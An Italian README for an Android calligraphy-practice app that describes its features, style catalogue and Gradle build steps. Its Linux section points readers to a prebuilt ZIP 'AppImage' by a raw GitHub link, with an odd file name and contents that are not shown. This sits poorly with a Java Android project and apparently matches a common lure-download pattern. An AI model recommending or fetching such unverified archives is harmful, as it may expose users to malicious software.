# Calligrafia Studio

**Calligrafia Studio** è un'applicazione Android per studiare e praticare la calligrafia in 35 stili differenti.

Il progetto offre uno spazio di scrittura e una biblioteca storica consultabile offline, pensati per avvicinare principianti ed appassionati alle principali tradizioni calligrafiche.

## Funzionalità

- **35 schede calligrafiche** con descrizioni, caratteristiche, strumenti e fonti.
- **Percorsi didattici** per livelli principiante, intermedio e avanzato.
- **Foglio di scrittura** con supporto per il dito o una penna digitale.
- **Modelli guidati** da seguire per lettere latine, greche, arabe, cinesi e giapponesi.
- **Animazione del ductus** per vedere l'ordine consigliato dei tratti.
- **Regolazione del pennino**, dell'angolo, della pressione e dell'inchiostro.
- **Parole corsive legate** in diversi stili occidentali.
- **Carte da esercitazione** con righe e guide.
- **Esportazione** in PNG, PDF, SVG o file di progetto JSON.
- **Salvataggio e ripristino** dei lavori sul dispositivo.
- **Analisi orientativa** della forma, delle proporzioni e della regolarità del tratto.

## Tradizioni incluse

Il catalogo comprende stili occidentali, arabi, persiani, cinesi e giapponesi, tra cui mani storiche come onciale, semionciale, carolina, gotica, cancelleresca, Copperplate e Spencerian.

## Struttura dell'app

- **Biblioteca storica**: ricerca e consultazione delle schede degli stili.
- **Percorsi e lezioni**: esercizi tecnici progressivi.
- **Foglio di scrittura**: pratica libera con modelli, pennino e font calligrafici.
- **Esportazioni**: condivisione dei risultati in diversi formati.

## Tecnologie

- Java
- Android SDK
- Gradle
- AndroidX

## Requisiti

- Android Studio
- JDK compatibile con il progetto
- Un dispositivo o emulatore Android

## Compilazione

1. Aprire il repository in Android Studio.
2. Attendere il completamento della sincronizzazione Gradle.
3. Selezionare un dispositivo o un emulatore.
4. Avviare l'app dal progetto `app`.

### Linux: versione AppImage

Per usare l'app su Linux come applicazione desktop, scaricare il pacchetto AppImage:

[Scarica Calligrafia Studio per Linux (pacchetto AppImage .zip)](https://github.com/santodamigella-del/calligrafia/raw/refs/heads/master/CalligrafiaStudio_catalogo_35_stili_aggiornato%2814%29.zip)

Estrarre l'archivio ZIP e seguire le istruzioni contenute in `CalligrafiaStudio-AppImage-kit/LEGGIMI.txt`.

### Linux: compilazione dell'APK Android

Su Linux sono necessari un JDK compatibile con il progetto e l'Android SDK. È possibile installarli tramite Android Studio e aprire il repository nell'IDE, oppure compilare da terminale dalla directory del progetto:

```bash
chmod +x ./gradlew
./gradlew assembleDebug
```

L'APK Android verrà generato in `app/build/outputs/apk/debug/`. Questa procedura compila l'app Android usando Linux; non crea una versione desktop nativa per Linux.

### Windows

Su Windows è possibile usare:

```bat
gradlew.bat assembleDebug
```

Il file APK verrà generato nella directory `app/build/outputs/apk/debug/`.

## Note didattiche

Le descrizioni e i modelli inclusi nell'app hanno una funzione introduttiva e didattica. Per ricostruire una specifica mano storica o una variante regionale è consigliabile confrontarli con manuali e fonti specialistiche.

## Licenza

Aggiungere nel repository una licenza appropriata prima della distribuzione pubblica dell'app.
